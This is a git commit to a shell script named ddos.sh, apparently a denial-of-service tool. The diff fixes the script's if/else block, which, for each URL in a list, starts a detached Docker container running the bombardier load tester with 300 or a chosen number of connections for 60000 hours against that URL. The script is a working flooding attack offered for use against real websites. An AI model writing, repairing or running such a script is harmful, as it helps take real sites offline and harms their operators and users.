0c3dc2367d1acae2d463ab0f2d6838791ab5be0f
koterion <koterion317@gmail.com>
2022-02-27 09:43:33 +0200

    Fix script

--- ddos.sh
+++ ddos.sh
@@ -9,9 +9,10 @@ for i in "${lines[@]}"
 do
    echo "$i"
    export URL=$i
-if [ -n "$1" ]
-then
-  docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
-else
-  docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
+    if [ -n "$1" ]
+    then
+    docker run --platform linux/amd64 -d  alpine/bombardier -c $1 -d 60000h -l $URL
+    else
+    docker run --platform linux/amd64 -d  alpine/bombardier -c 300 -d 60000h -l $URL
+    fi
  done
